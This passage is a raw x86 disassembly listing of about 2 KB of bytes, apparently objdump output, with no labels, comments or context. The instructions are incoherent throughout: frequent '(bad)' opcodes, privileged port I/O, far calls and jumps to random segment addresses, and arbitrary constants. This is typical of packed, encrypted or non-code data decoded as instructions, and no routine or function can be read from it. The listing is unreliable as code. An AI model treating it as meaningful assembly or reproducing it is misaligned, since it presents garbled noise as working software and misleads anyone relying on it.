  40d825:	xchg   edx,eax
  40d826:	data16 (bad) 
  40d828:	int3   
  40d829:	daa    
  40d82a:	mov    al,ds:0x4f201955
  40d82f:	mov    esi,0x8e17de63
  40d834:	fcom   DWORD PTR [ebp+0x7e0be2a3]
  40d83a:	sub    eax,0x4c503be7
  40d83f:	push   esp
  40d840:	push   edx
  40d841:	add    bl,bl
  40d843:	loopne 0x40d7de
  40d845:	dec    eax
  40d846:	pushf  
  40d847:	call   0x7f80:0x3513fdee
  40d84e:	int    0xe1
  40d850:	add    eax,0xf1d970e9
  40d855:	jl     0x40d7da
  40d857:	jmp    0x9fd473df
  40d85c:	add    ch,BYTE PTR [esi-0x1b]
  40d85f:	or     DWORD PTR [edx-0x52620bff],ebp
  40d865:	mov    esi,0x36a02761
  40d86a:	jb     0x40d874
  40d86c:	pop    ecx
  40d86d:	or     edi,DWORD PTR [ebx]
  40d86f:	fist   WORD PTR [edi+0x61]
  40d872:	dec    edi
  40d873:	cmp    DWORD PTR [edx-0x5c948885],esp
  40d879:	sbb    eax,0x18175cff
  40d87e:	add    BYTE PTR [eax+ecx*2],dl
  40d881:	mov    esp,DWORD PTR [edi-0xa]
  40d884:	push   esp
  40d885:	in     eax,dx
  40d886:	mov    DWORD PTR [edi-0x7c],0xd5811d76
  40d88d:	mov    dh,0x4b
  40d88f:	neg    BYTE PTR [eax-0x47283c8b]
  40d895:	retf   0x4b60
  40d898:	dec    edi
  40d899:	cmp    eax,0x601d6448
  40d89e:	ret    0xf793
  40d8a1:	sbb    ch,bl
  40d8a3:	sub    eax,0xd56c655
  40d8a8:	lods   eax,DWORD PTR ds:[esi]
  40d8a9:	stos   BYTE PTR es:[edi],al
  40d8aa:	push   0xffffff8b
  40d8ac:	and    DWORD PTR [ebx],eax
  40d8ae:	pop    esi
  40d8af:	imul   esp,esp,0xffffff85
  40d8b2:	in     al,0x5a
  40d8b4:	jge    0x40d908
  40d8b6:	jle    0x40d930
  40d8b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b9:	xchg   edi,eax
  40d8ba:	and    BYTE PTR [ebx],ah
  40d8bc:	mov    ds:0x54a3393d,al
  40d8c1:	bound  ebx,QWORD PTR [ebp+0x3f]
  40d8c4:	adc    eax,0xf2838d04
  40d8c9:	mov    BYTE PTR [esi],ch
  40d8cb:	fst    DWORD PTR [edx]
  40d8cd:	bound  ebx,QWORD PTR [eax+0x2f]
  40d8d0:	call   0x2710:0x7f8fd31e
  40d8d7:	dec    esi
  40d8d8:	sub    al,0x3c
  40d8da:	jno    0x40d8be
  40d8dc:	out    dx,eax
  40d8dd:	dec    edi
  40d8de:	or     eax,0x2dfd6286
  40d8e3:	adc    al,0xab
  40d8e5:	mov    esi,0xc584115d
  40d8ea:	lds    ecx,FWORD PTR [ecx+0x1]
  40d8ed:	icebp  
  40d8ee:	fs jo  0x40d87b
  40d8f1:	pop    edi
  40d8f2:	mov    bl,bh
  40d8f4:	xchg   esi,eax
  40d8f5:	and    DWORD PTR [ecx-0x614cdf0c],esi
  40d8fb:	push   esi
  40d8fc:	dec    ebp
  40d8fd:	and    dh,dh
  40d8ff:	push   eax
  40d900:	(bad)  
  40d901:	call   0x755c456d
  40d906:	iret   
  40d907:	pusha  
  40d908:	test   DWORD PTR [ecx+0x4a],ecx
  40d90b:	in     al,0xb9
  40d90d:	push   ebx
  40d90e:	jle    0x40d8fb
  40d910:	and    edi,DWORD PTR [esi]
  40d912:	cmp    BYTE PTR [eax-0x181a1dcc],0xc8
  40d919:	rcr    eax,1
  40d91b:	retf   
  40d91c:	cmp    edx,ecx
  40d91e:	(bad)  
  40d91f:	aas    
  40d920:	push   eax
  40d921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d922:	push   ss
  40d923:	aaa    
  40d924:	pop    ecx
  40d925:	cli    
  40d926:	outs   dx,BYTE PTR ds:[esi]
  40d927:	inc    ebx
  40d928:	and    cl,BYTE PTR [ebx-0x2986b5e2]
  40d92e:	sbb    BYTE PTR [eiz*8+0x52783ca5],ch
  40d935:	pop    ebx
  40d936:	std    
  40d937:	dec    ebp
  40d938:	mov    al,ds:0x85da7670
  40d93d:	les    esi,FWORD PTR [ebp-0xaf366a0]
  40d943:	sub    bl,BYTE PTR ds:[esi]
  40d946:	and    DWORD PTR [ebx],ebx
  40d948:	and    al,BYTE PTR [edi-0x7a]
  40d94b:	cmp    al,BYTE PTR [ebp+0x6ad9684b]
  40d951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d952:	gs fcmovnbe st,st(2)
  40d955:	aam    0x7e
  40d957:	frstor [ebp+ebp*1+0x55]
  40d95b:	out    0x45,al
  40d95d:	out    dx,eax
  40d95e:	shl    BYTE PTR fs:[edx+0x1],1
  40d962:	inc    ebp
  40d963:	jmp    0x800d:0x5eee1957
  40d96a:	adc    al,0x3c
  40d96c:	push   eax
  40d96d:	ins    DWORD PTR es:[edi],dx
  40d96e:	clc    
  40d96f:	out    0x4e,al
  40d971:	xchg   esp,eax
  40d972:	out    0xee,al
  40d974:	enter  0xc725,0xd8
  40d978:	inc    edx
  40d979:	ins    BYTE PTR es:[edi],dx
  40d97a:	in     al,dx
  40d97b:	imul   edx,DWORD PTR [eiz*2+0x3fd2700e],0xde83f0b2
  40d986:	xchg   esp,eax
  40d987:	nop
  40d988:	mov    edi,esi
  40d98a:	fwait
  40d98b:	mov    ds:0x237b2502,eax
  40d991:	jns    0x40d932
  40d993:	aaa    
  40d994:	and    dl,dh
  40d996:	push   esi
  40d997:	add    ebp,edx
  40d999:	lea    esp,[ebx+0x6565413c]
  40d99f:	ja     0x40d9c8
  40d9a1:	scas   al,BYTE PTR es:[edi]
  40d9a2:	std    
  40d9a3:	fwait
  40d9a4:	cmc    
  40d9a5:	lods   eax,DWORD PTR ds:[esi]
  40d9a6:	outs   dx,BYTE PTR ds:[esi]
  40d9a7:	into   
  40d9a8:	enter  0x3209,0xae
  40d9ac:	xchg   ebx,eax
  40d9ad:	or     eax,0x1fac88f
  40d9b2:	xor    BYTE PTR [ecx+0x57fe9796],bh
  40d9b8:	into   
  40d9b9:	xchg   edi,eax
  40d9ba:	jp     0x40d9f7
  40d9bc:	call   0x34b7:0x3168dab9
  40d9c3:	sbb    ch,BYTE PTR [edx+eiz*8]
  40d9c6:	repnz into 
  40d9c8:	gs inc edx
  40d9ca:	mov    ah,0x2b
  40d9cc:	pop    ds
  40d9cd:	jnp    0x40d9b0
  40d9cf:	pusha  
  40d9d0:	ins    DWORD PTR es:[edi],dx
  40d9d1:	(bad)  
  40d9d2:	test   eax,0x589fd061
  40d9d7:	add    eax,0x7b214e25
  40d9dc:	add    BYTE PTR [edi-0xa47dc3d],al
  40d9e2:	push   esp
  40d9e3:	cmp    esi,ecx
  40d9e5:	call   0x9b0e61c0
  40d9ea:	leave  
  40d9eb:	jmp    0x40da22
  40d9ed:	push   ds
  40d9ee:	jle    0x40da28
  40d9f0:	int3   
  40d9f1:	inc    edx
  40d9f2:	scas   eax,DWORD PTR es:[edi]
  40d9f3:	mov    ecx,0xae7997d
  40d9f8:	sbb    al,0xb3
  40d9fa:	mov    edi,0x3f96813a
  40d9ff:	stos   DWORD PTR es:[edi],eax
  40da00:	add    dl,BYTE PTR [ebx+0x4091c3bc]
  40da06:	jne    0x40da02
  40da08:	mov    dh,0x5c
  40da0a:	jnp    0x40d998
  40da0c:	and    DWORD PTR [eax],ecx
  40da0e:	mov    ds:0x699bd7aa,al
  40da13:	rcl    BYTE PTR [ebp+0x45f967ad],0xf4
  40da1a:	out    0x67,al
  40da1c:	les    eax,FWORD PTR [ebx+0x5]
  40da1f:	sbb    cl,BYTE PTR [ebx-0x2c]
  40da22:	pop    ds
  40da23:	mov    ds:0xbb1b8323,eax
  40da28:	jbe    0x40d9d5
  40da2a:	in     eax,0xee
  40da2c:	push   ss
  40da2d:	xchg   edi,eax
  40da2e:	sub    eax,0x13941231
  40da33:	push   eax
  40da34:	xchg   BYTE PTR [edx],dl
  40da36:	push   es
  40da37:	jmp    0x8bed72a7
  40da3c:	fcom   DWORD PTR ds:[edi-0x140d383a]
  40da43:	and    al,dl
  40da45:	pop    esi
  40da46:	rcl    BYTE PTR [esi-0x69c863c2],0xd3
  40da4d:	push   esi
  40da4e:	repz xchg ebp,eax
  40da50:	scas   eax,DWORD PTR es:[edi]
  40da51:	mov    ds:0x156ff98c,al
  40da56:	lahf   
  40da57:	ds adc al,0xe
  40da5a:	pop    edx
  40da5b:	inc    ebp
  40da5c:	cmp    dh,BYTE PTR [ebp+0x42]
  40da5f:	inc    ecx
  40da60:	xchg   BYTE PTR [eax+0x53],dh
  40da63:	xor    eax,0x44ab3933
  40da68:	or     dl,BYTE PTR [ecx-0x3c0ce84b]
  40da6e:	es sahf 
  40da70:	out    0x1c,eax
  40da72:	or     al,0xd0
  40da74:	out    dx,eax
  40da75:	fnstenv [ebp+0x38]
  40da78:	xor    al,0x1d
  40da7a:	xor    DWORD PTR [edi-0x1c],edx
  40da7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da7e:	dec    esi
  40da7f:	ds call 0xb0d6:0x8571afa8
  40da87:	pushw  es
  40da89:	cs mov ebx,0x70f61251
  40da8f:	jg     0x40da19
  40da91:	xchg   ebp,eax
  40da92:	shr    BYTE PTR [ebp-0x75],cl
  40da95:	cs pop eax
  40da97:	icebp  
  40da98:	xor    dl,ah
  40da9a:	adc    cl,BYTE PTR [ebp-0x30896453]
  40daa0:	mov    ebp,0xcf842605
  40daa5:	or     al,0x37
  40daa7:	sub    edi,DWORD PTR [ecx-0x6b4ada40]
  40daad:	mov    al,0x1e
  40daaf:	dec    ebp
  40dab0:	call   0x1561665
  40dab5:	jae    0x40da87
  40dab7:	pop    DWORD PTR ds:0x9807e7b1
  40dabd:	mov    ch,0xeb
  40dabf:	(bad)  
  40dac0:	dec    eax
  40dac1:	lds    ebp,FWORD PTR [ecx+0x408abcaf]
  40dac7:	retf   0x3ca3
  40daca:	mov    bl,0x1b
  40dacc:	or     eax,0x2b3e48e8
  40dad1:	xchg   edx,eax
  40dad2:	add    bh,dh
  40dad4:	add    bl,BYTE PTR ds:0xfe650220
  40dada:	pop    ecx
  40dadb:	cmp    BYTE PTR [ecx-0x3f912fcb],0x6e
  40dae2:	lds    edi,FWORD PTR [ebx+ebp*2]
  40dae5:	out    dx,al
  40dae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae7:	je     0x40db3d
  40dae9:	sbb    BYTE PTR ds:0x5adb941f,bh
  40daf0:	lods   eax,DWORD PTR ds:[esi]
  40daf1:	call   0xf297:0xddbb0d1
  40daf8:	call   0x79a14c63
  40dafd:	btr    eax,esi
  40db00:	jmp    0x4a6a:0x7a311bd1
  40db07:	push   0xffffffec
  40db09:	push   ebp
  40db0a:	fcomp  QWORD PTR [edi]
  40db0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db0d:	out    dx,eax
  40db0e:	clc    
  40db0f:	aaa    
  40db10:	mov    al,0xfc
  40db12:	mov    bl,0x1f
  40db14:	leave  
  40db15:	dec    ebx
  40db16:	int3   
  40db17:	sbb    al,0x5b
  40db19:	inc    edi
  40db1a:	es daa 
  40db1c:	inc    ebp
  40db1d:	sub    DWORD PTR [eax+0x56],esp
  40db20:	icebp  
  40db21:	push   ecx
  40db22:	js     0x40db13
  40db24:	and    al,0x8d
  40db26:	mov    ecx,0xbd26b0d4
  40db2b:	push   0x15
  40db2d:	or     bh,BYTE PTR [edi+edi*1-0x41]
  40db31:	push   ebp
  40db32:	sbb    dl,BYTE PTR [ebx+0x5f]
  40db35:	lock jmp 0x756c:0xee2bc383
  40db3d:	mov    ch,dl
  40db3f:	nop
  40db40:	out    0x64,eax
  40db42:	jbe    0x40db44
  40db44:	xchg   DWORD PTR [ecx-0x34],esp
  40db47:	mov    ecx,0x451706d2
  40db4c:	pop    ebp
  40db4d:	gs je  0x40db37
  40db50:	and    edx,DWORD PTR [esi-0x59]
  40db53:	fild   DWORD PTR [esi]
  40db55:	retf   
  40db56:	pop    ds
  40db57:	stc    
  40db58:	js     0x40db16
  40db5a:	arpl   WORD PTR [edx-0x53d199b1],si
  40db60:	adc    ecx,ecx
  40db62:	dec    esp
  40db63:	xchg   edi,eax
  40db64:	in     eax,dx
  40db65:	mov    bl,0x79
  40db67:	push   0x372fbd83
  40db6c:	imul   eax
  40db6e:	retf   0xe75d
  40db71:	xor    al,0x9f
  40db73:	jmp    edx
  40db75:	(bad)  
  40db76:	push   edi
  40db77:	out    dx,eax
  40db78:	out    0xf6,al
  40db7a:	inc    esp
  40db7b:	setb   BYTE PTR [edi-0x53cf106b]
  40db82:	ret    
  40db83:	push   eax
  40db84:	pop    edi
  40db85:	mov    ah,ah
  40db87:	sbb    eax,0xc1b607c0
  40db8c:	fcmovnu st,st(7)
  40db8e:	or     BYTE PTR [ecx-0x37],al
  40db91:	icebp  
  40db92:	shl    ebx,cl
  40db94:	ret    0xb563
  40db97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db98:	push   esp
  40db99:	(bad)  
  40db9a:	mov    ch,BYTE PTR [edi]
  40db9c:	mov    eax,0xd893d5cb
  40dba1:	pop    ebx
  40dba3:	aam    0xcc
  40dba5:	mov    ebp,DWORD PTR [edx+0x1192754d]
  40dbab:	jne    0x40dbea
  40dbad:	push   es
  40dbae:	aas    
  40dbaf:	repz test al,0x6e
  40dbb2:	cmc    
  40dbb3:	jno    0x40dbea
  40dbb5:	or     eax,0xd348d8e6
  40dbba:	out    0xe5,eax
  40dbbc:	add    ah,BYTE PTR [eax-0x17d760f2]
  40dbc2:	cmp    esi,esp
  40dbc4:	retf   
  40dbc5:	loope  0x40db50
  40dbc7:	xor    ebp,esi
  40dbc9:	popa   
  40dbca:	pop    ebx
  40dbcb:	cmp    eax,0xa5d5dca1
  40dbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbd1:	push   ax
  40dbd3:	sub    eax,0x59f74c4b
  40dbd8:	shl    BYTE PTR [esi+ebx*1],cl
  40dbdb:	pop    ax
  40dbdd:	xor    DWORD PTR [edx+ebx*2-0x26],edi
  40dbe1:	or     edi,edx
  40dbe3:	jg     0x40dc36
  40dbe5:	neg    BYTE PTR [ebx]
  40dbe7:	clc    
  40dbe8:	adc    eax,0x1776fd7f
  40dbed:	push   edi
  40dbee:	jnp    0x40dc25
  40dbf0:	inc    ebx
  40dbf1:	xor    dh,BYTE PTR [ebp-0x729fdffc]
  40dbf7:	sbb    al,0x36
  40dbf9:	test   al,0x9a
  40dbfb:	jp     0x40dc67
  40dbfd:	and    eax,DWORD PTR ss:[esi]
  40dc00:	or     DWORD PTR [eax+esi*1-0x12ed8777],ecx
  40dc07:	ja     0x40dba5
  40dc09:	stc    
  40dc0a:	in     al,0x13
  40dc0c:	fdivr  DWORD PTR [ebx-0x5d]
  40dc0f:	lods   eax,DWORD PTR ds:[esi]
  40dc10:	gs test al,0x9f
  40dc13:	arpl   WORD PTR [edx+0x50276d3c],sp
  40dc19:	sahf   
  40dc1a:	in     eax,dx
  40dc1b:	ins    BYTE PTR es:[edi],dx
  40dc1c:	jle    0x40dbc2
  40dc1e:	stos   BYTE PTR es:[edi],al
  40dc1f:	pop    ss
  40dc20:	dec    esp
  40dc21:	push   es
  40dc22:	shl    BYTE PTR [ebp-0x6299bbb7],1
  40dc28:	mov    ebx,0x48548380
  40dc2d:	xchg   BYTE PTR [ebp+0x59],ah
  40dc30:	out    dx,al
  40dc31:	fstp   DWORD PTR [ebp-0x15ca15c5]
  40dc37:	jnp    0x40dbce
  40dc39:	test   BYTE PTR [ebx-0x1a5a410a],0x22
  40dc40:	fwait
  40dc41:	pop    edi
  40dc42:	or     al,0xc9
  40dc44:	inc    esi
  40dc45:	sub    bh,bh
  40dc47:	mov    esp,0xc733fd89
  40dc4c:	mov    eax,ds:0xa176066a
  40dc51:	ror    BYTE PTR [eax-0x6d9e3bfb],1
  40dc57:	cmp    eax,DWORD PTR [eax-0x2234010a]
  40dc5d:	mov    ds:0x7651559e,al
  40dc62:	popf   
  40dc63:	pop    ebp
  40dc64:	(bad)  
  40dc65:	adc    ebx,DWORD PTR [ebx]
  40dc67:	cmp    eax,0xa4917a7a
  40dc6c:	mov    esp,0x2d0c3030
  40dc71:	ror    BYTE PTR [esi-0x1c],cl
  40dc74:	(bad)  
  40dc75:	mov    edi,0x9da1821a
  40dc7a:	mov    dh,0xe2
  40dc7c:	sub    cl,ch
  40dc7e:	mov    ebx,0x50c542ce
  40dc83:	das    
  40dc84:	pop    ds
  40dc85:	inc    edi
  40dc86:	scas   al,BYTE PTR es:[edi]
  40dc87:	in     al,0x6c
  40dc89:	paddusw mm7,QWORD PTR [eax]
  40dc8c:	adc    DWORD PTR [eax-0x3e],0xf
  40dc90:	icebp  
  40dc91:	aas    
  40dc92:	mov    ebx,0x882ec87b
  40dc97:	cmp    bh,BYTE PTR [edi-0x2a]
  40dc9a:	add    eax,0xc19ff40d
  40dc9f:	pop    ds
  40dca0:	push   esp
  40dca1:	mov    bl,0x77
  40dca3:	xor    dl,BYTE PTR [eax]
  40dca5:	mov    WORD PTR [eax],?
  40dca7:	push   ds
  40dca8:	mov    cl,0x8a
  40dcaa:	(bad)  
  40dcab:	loopne 0x40dcb4
  40dcad:	shr    BYTE PTR [eax-0x3a],cl
  40dcb0:	mov    edi,0x4e2ae364
  40dcb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcb6:	call   0xbc95:0xd0803a8
  40dcbd:	xchg   esp,eax
  40dcbe:	and    bl,BYTE PTR [eax+edx*8]
  40dcc1:	int    0xc5
  40dcc3:	js     0x40dc5f
  40dcc5:	sub    BYTE PTR [edi-0x67210df8],al
  40dccb:	cmp    dl,ch
  40dccd:	mov    edx,0x584017ea
  40dcd2:	test   DWORD PTR [edx+0x1a],esp
  40dcd5:	(bad)  
  40dcd6:	jp     0x40dcef
  40dcd8:	jb     0x40dd33
  40dcda:	out    0x2b,al
  40dcdc:	mov    ds:0x7d335432,al
  40dce1:	fsubp  st(2),st
  40dce3:	sub    esp,esp
  40dce5:	and    eax,0x7ee2dbb3
  40dcea:	hlt    
  40dceb:	mov    ds:0x50633d8b,eax
  40dcf0:	xor    al,0xd9
  40dcf2:	popa   
  40dcf3:	test   DWORD PTR [edx+0x5d4f372a],edi
  40dcf9:	icebp  
  40dcfa:	stos   DWORD PTR es:[edi],eax
  40dcfb:	dec    ebp
  40dcfc:	out    dx,al
  40dcfd:	int    0x11
  40dcff:	js     0x40dcef
  40dd01:	pop    esp
  40dd02:	out    0xfa,al
  40dd04:	lgdtd  [edi-0x60]
  40dd08:	xor    eax,0xcb8eef5a
  40dd0d:	add    ebp,edi
  40dd0f:	dec    esi
  40dd10:	(bad)  
  40dd11:	cwde   
  40dd12:	rol    BYTE PTR [ecx],1
  40dd14:	jge    0x40dd64
  40dd16:	mov    WORD PTR es:[edx-0x75],ds
  40dd1a:	add    al,BYTE PTR [ecx]
  40dd1c:	and    ch,BYTE PTR [eax-0x67]
  40dd1f:	mov    eax,0x61624f2f
  40dd24:	jmp    0xed9e:0xd4e7a2e1
  40dd2b:	xchg   DWORD PTR [edi+0x39],eax
  40dd2e:	adc    edx,0xe2218f5f
  40dd34:	xchg   esi,eax
  40dd35:	cmp    al,0xda
  40dd37:	push   ecx
  40dd38:	mov    edi,0x9f63dc36
  40dd3d:	jmp    0x482ebb59
  40dd42:	adc    DWORD PTR [esi-0x40],ebx
  40dd45:	mov    esi,0xf42028eb
  40dd4a:	mov    eax,fs:0xa9998e09
  40dd50:	mov    esp,cs
  40dd52:	mov    bl,0xef
  40dd54:	sbb    ch,ch
  40dd56:	mov    edx,0xb4c35450
  40dd5b:	repnz and eax,0x5f9f167b
  40dd61:	cmp    eax,0xeacdd6b5
  40dd66:	add    DWORD PTR [edi],esp
  40dd68:	clflush BYTE PTR [ecx-0x29eff1f1]
  40dd6f:	popf   
  40dd70:	retf   
  40dd71:	das    
  40dd72:	hlt    
  40dd73:	or     dh,BYTE PTR [eax-0x4d]
  40dd76:	and    eax,0x9531cc89
  40dd7b:	mov    ebp,0x5b6c8577
  40dd80:	out    dx,eax
  40dd81:	fsubrp st(3),st
  40dd83:	and    eax,esp
  40dd85:	cwde   
  40dd86:	in     al,0x3e
  40dd88:	mov    eax,ds:0x3ddee14c
  40dd8d:	cld    
  40dd8e:	enter  0x9dbe,0x30
  40dd92:	mov    bl,0x16
  40dd94:	adc    BYTE PTR [ecx+0x38e21c8e],0xae
  40dd9b:	gs add edi,edi
  40dd9e:	pop    es
  40dd9f:	ds lahf 
  40dda1:	jo     0x40dd6e
  40dda3:	outs   dx,BYTE PTR ds:[esi]
  40dda4:	sub    DWORD PTR [eax+0x9194ef7],esp
  40ddaa:	cdq    
  40ddab:	push   eax
  40ddac:	mov    al,ds:0x90996738
  40ddb1:	and    DWORD PTR [edi],eax
  40ddb3:	shr    DWORD PTR [ebp+0x3e832c6e],cl
  40ddb9:	sub    eax,0xa576550a
  40ddbe:	mov    dh,0xe0
  40ddc0:	mov    eax,ds:0x310958ce
  40ddc5:	and    bl,BYTE PTR [edx+edx*4]
  40ddc8:	jp     0x40ddf3
  40ddca:	cmp    dh,ah
  40ddcc:	gs xchg al,bh
  40ddcf:	test   bl,ah
  40ddd1:	loop   0x40ddba
  40ddd3:	inc    eax
  40ddd4:	mov    ebx,0x65a8491f
  40ddd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddda:	(bad)  
  40dddb:	int3   
  40dddc:	std    
  40dddd:	xchg   DWORD PTR [ecx+0xa],ecx
  40dde0:	xchg   esp,eax
  40dde1:	cs (bad) 
  40dde3:	ror    DWORD PTR [esp+ecx*2],cl
  40dde6:	hlt    
  40dde7:	(bad)  
  40dde8:	push   cs
  40dde9:	push   ebp
  40ddea:	mov    al,ds:0x82f4e268
  40ddef:	xor    al,0x88
  40ddf1:	mov    ecx,0xf1f369c1
  40ddf6:	daa    
  40ddf7:	push   ecx
  40ddf8:	fistp  DWORD PTR [esi+0x38]
  40ddfb:	(bad)  
  40ddfc:	aas    
  40ddfd:	or     ch,BYTE PTR [esi+0x59]
  40de00:	jne    0x40de45
  40de02:	stos   DWORD PTR es:[edi],eax
  40de03:	xchg   esp,eax
  40de04:	inc    eax
  40de05:	mov    ebx,DWORD PTR [eax]
  40de07:	dec    ecx
  40de08:	int3   
  40de09:	inc    esi
  40de0a:	xor    ah,BYTE PTR [edi-0x60e33a62]
  40de10:	jb     0x40de7e
  40de12:	sub    dh,BYTE PTR [ebx-0x28c498fb]
  40de18:	ficom  DWORD PTR [esi]
  40de1a:	jb     0x40de45
  40de1c:	jl     0x40ddfe
  40de1e:	outs   dx,BYTE PTR ds:[esi]
  40de1f:	mov    ebx,0x96c7a522
  40de24:	mov    bh,0x31
  40de26:	sbb    esp,esi
  40de28:	or     eax,0x8d7d1206
  40de2d:	dec    esi
  40de2e:	jp     0x40de8e
  40de30:	loop   0x40ddea
  40de32:	aas    
  40de33:	fucomp st(6)
  40de35:	mov    BYTE PTR [ecx-0x73],dh
  40de38:	sti    
  40de39:	imul   esi,esp,0xdee26e82
  40de3f:	xchg   ebp,eax
  40de40:	inc    eax
  40de41:	dec    edx
  40de42:	dec    esp
  40de43:	in     al,dx
  40de44:	jae    0x40de9e
  40de46:	into   
  40de47:	pushf  
  40de48:	retf   
  40de49:	xchg   esp,eax
  40de4a:	cmc    
  40de4b:	push   ds
  40de4c:	enter  0xe2a1,0x35
  40de50:	ins    BYTE PTR es:[edi],dx
  40de51:	call   0xb141:0x934b15b8
  40de58:	clc    
  40de59:	lods   eax,DWORD PTR ds:[esi]
  40de5a:	pop    edx
  40de5b:	dec    ebx
  40de5c:	out    dx,al
  40de5d:	and    DWORD PTR [ecx-0x57ebe788],0x459ad2a8
  40de67:	nop
  40de68:	mov    edx,0x251b1f66
  40de6d:	sub    al,0xf2
  40de6f:	mov    esi,0xa25a83f8
  40de74:	aam    0x83
  40de76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de77:	sub    edi,DWORD PTR [esi+0x5b]
  40de7a:	fwait
  40de7b:	imul   esp,DWORD PTR [ecx],0xc
  40de7e:	adc    esi,DWORD PTR [ebx-0x3b]
  40de81:	retf   
  40de82:	mov    esi,0x4bed12e7
  40de87:	mov    esi,0x63818e31
  40de8c:	scas   eax,DWORD PTR es:[edi]
  40de8d:	push   0x223a84d3
  40de92:	fild   QWORD PTR [edx+edx*2+0x69ac8cea]
  40de99:	xlat   BYTE PTR ds:[ebx]
  40de9a:	lods   al,BYTE PTR ds:[esi]
  40de9b:	test   DWORD PTR [edi+0x5d],esi
  40de9e:	sub    esi,edi
  40dea0:	push   eax
  40dea1:	fmul   QWORD PTR [ecx+0x43]
  40dea4:	hlt    
  40dea5:	mov    esi,0x7b9cad76
  40deab:	pop    ebp
  40deac:	dec    esp
  40dead:	loope  0x40dec6
  40deaf:	std    
  40deb0:	sub    al,0x84
  40deb2:	mov    esi,0x1615bed9
  40deb7:	outs   dx,DWORD PTR ds:[esi]
  40deb8:	ffreep st(4)
  40deba:	jno    0x40df37
  40debc:	xchg   BYTE PTR [eax+0x1d],ch
  40debf:	jl     0x40df3a
  40dec1:	add    BYTE PTR [edx+0x65c3f837],dl
  40dec7:	sub    ebp,DWORD PTR [esi]
  40dec9:	leave  
  40deca:	push   cs
  40decb:	or     BYTE PTR [ebp-0x7914206e],bh
  40ded1:	shr    BYTE PTR [ecx+eax*2-0x18],0x55
  40ded6:	mov    ecx,0x6aa7d184
  40dedb:	(bad)  
  40dedc:	out    0xaa,eax
  40dede:	jnp    0x40deb7
  40dee0:	pop    es
  40dee1:	dec    esi
  40dee2:	leave  
  40dee3:	fstp   QWORD PTR [ebx]
  40dee5:	sub    ch,bl
  40dee7:	sub    edx,edx
  40dee9:	imul   esp,DWORD PTR [esi+0x4a545bbd],0xffffffe0
  40def0:	sti    
  40def1:	call   0x9d03b675
  40def6:	xchg   esp,eax
  40def7:	sbb    eax,0xae9463e4
  40defc:	(bad)  
  40defd:	retf   
  40defe:	fimul  DWORD PTR [edx-0x1d]
  40df01:	popa   
  40df02:	cmc    
  40df03:	push   esi
  40df04:	pop    ds
  40df05:	addr16 xchg esi,eax
  40df07:	hlt    
  40df08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df09:	mov    ebx,0xe4123e6b
  40df0e:	dec    eax
  40df0f:	pop    esp
  40df10:	cs dec ebx
  40df12:	pusha  
  40df13:	cmp    ch,bh
  40df15:	ins    BYTE PTR es:[edi],dx
  40df16:	jno    0x40deb9
  40df18:	adc    al,0x9c
  40df1a:	mov    cl,BYTE PTR [ebx]
  40df1c:	mov    WORD PTR [ebx],cs
  40df1e:	xor    al,0x32
  40df20:	inc    ebp
  40df21:	push   0x45
  40df23:	xchg   ecx,eax
  40df24:	and    ebp,DWORD PTR [edi+esi*1+0x72d8e965]
  40df2b:	or     ebp,DWORD PTR [ebx+0x12f223e8]
  40df31:	rol    BYTE PTR [esi+0x53a1ae45],cl
  40df37:	fcomp  QWORD PTR [ebx]
  40df39:	data16 jns 0x40df13
  40df3c:	fld    QWORD PTR [eax]
  40df3e:	pop    ebp
  40df3f:	imul   ebp,DWORD PTR [ecx-0x22],0x53
  40df43:	push   ebp
  40df44:	icebp  
  40df45:	push   cs
  40df46:	jae    0x40df30
  40df48:	(bad)  
  40df49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df4a:	hlt    
  40df4b:	push   esp
  40df4c:	fwait
  40df4d:	jp     0x40df36
  40df4f:	daa    
  40df50:	leave  
  40df51:	xor    eax,0xcaaefa4d
  40df56:	out    0x13,al
  40df58:	xor    DWORD PTR ds:[ecx-0x560dfdb5],ecx
  40df5f:	test   eax,0xf6d010cd
  40df64:	and    BYTE PTR [edi-0x6e],0x31
  40df68:	loopne 0x40dfc0
  40df6a:	pop    esi
  40df6b:	push   ebx
  40df6c:	ss repnz pop ds
  40df6f:	enter  0x5837,0xcf
  40df73:	icebp  
  40df74:	inc    ebp
  40df75:	neg    DWORD PTR ds:0x959d241e
  40df7b:	sub    DWORD PTR [edi+0x38],0x5f
  40df7f:	xor    eax,0x2de25373
  40df84:	lods   eax,DWORD PTR ds:[esi]
  40df85:	aad    0x72
  40df87:	sub    BYTE PTR [esi],cl
  40df89:	jae    0x40df11
  40df8b:	das    
  40df8c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df8e:	xchg   ecx,eax
  40df8f:	sub    BYTE PTR [edx+0x49cb64ce],ch
  40df95:	aaa    
  40df96:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40df98:	inc    ebx
  40df99:	pop    eax
  40df9a:	fucomi st,st(3)
  40df9c:	dec    eax
  40df9d:	and    eax,0x4fe1b7ea
  40dfa2:	ret    
  40dfa3:	push   ds
  40dfa4:	mov    edi,0x947b2136
  40dfa9:	rcl    eax,1
  40dfab:	sub    al,BYTE PTR [eax]
  40dfad:	out    0x86,al
  40dfaf:	jl     0x40df87
  40dfb1:	dec    ebx
  40dfb2:	ins    DWORD PTR es:[edi],dx
  40dfb3:	mov    al,0xb4
  40dfb5:	push   0xffffff83
  40dfb7:	in     eax,dx
  40dfb8:	sbb    BYTE PTR [eax+0x40d763ca],bh
  40dfbe:	in     eax,0xb
  40dfc0:	mov    ds:0x9543b655,eax
  40dfc5:	fwait
  40dfc6:	xor    ah,BYTE PTR [ebx+0x73]
  40dfc9:	jbe    0x40dff6
  40dfcb:	jne    0x40e016
  40dfcd:	mov    ds:0x9a47fd82,eax
